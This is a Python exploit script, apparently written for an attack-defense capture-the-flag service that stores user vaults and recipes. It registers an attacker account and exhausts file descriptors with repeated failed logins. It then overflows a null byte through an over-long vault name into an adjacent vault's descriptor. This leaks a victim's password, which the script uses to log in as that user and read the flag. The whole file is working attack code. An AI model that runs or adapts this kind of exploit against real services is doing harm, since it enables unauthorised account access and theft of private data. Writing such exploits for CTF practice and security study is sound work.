#!/usr/bin/env python3

import os
import sys
import json
from pwn import log
from client import Client, get_random_length_string, MAX_USERNAME_LEN, MAX_PASSWORD_LEN, MAX_VAULT_NAME_LEN

PORT = 2222

def exploit(ip, flag_id):

    FLAG_ID = json.loads(flag_id)

    STARTING_FD = 4

    attacker_username = get_random_length_string(MAX_USERNAME_LEN)
    attacker_password = get_random_length_string(MAX_PASSWORD_LEN)

    attacker_client = Client(ip, PORT)
    attacker_client.connect()

    attacker_client.signup(attacker_username, attacker_password)

    for _ in range(STARTING_FD, 0x101):
        attacker_client.login(FLAG_ID["username"], "", should_fail=True)

    attacker_client.login(attacker_username, attacker_password)

    # Create 2 vault slots
    attacker_client.create_vault("test_vault_1")
    attacker_client.back()
    attacker_client.create_vault("test_vault_2")
    attacker_client.back()

    # Close the first vault
    open_vaults = attacker_client.list_open_vaults()
    attacker_client.close_vault(open_vaults[0]["id"])

    # Create new vault. Takes the spot of vault 1 and overflows a null byte into the fd of vault 2
    attacker_client.create_vault("A"*MAX_VAULT_NAME_LEN)
    attacker_client.back()

    # Open the second vault
    attacker_client.enter_vault(open_vaults[1]["id"])

    # List recipes and get the leaked password. Name is the password
    recipes = attacker_client.list_recipes()
    leaked_password = recipes[0]["name"]

    attacker_client.back()
    attacker_client.logout()

    checker_client = Client(ip, PORT)
    checker_client.connect()
    checker_client.login(FLAG_ID["username"], leaked_password)
    checker_client.open_vault(FLAG_ID["vault"])
    checker_client.open_recipe(FLAG_ID["recipe"])
    flag = checker_client.show_recipe()["description"]

    return flag


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    
    log.success(f"Flag: {exploit(ip, flag_id)}")
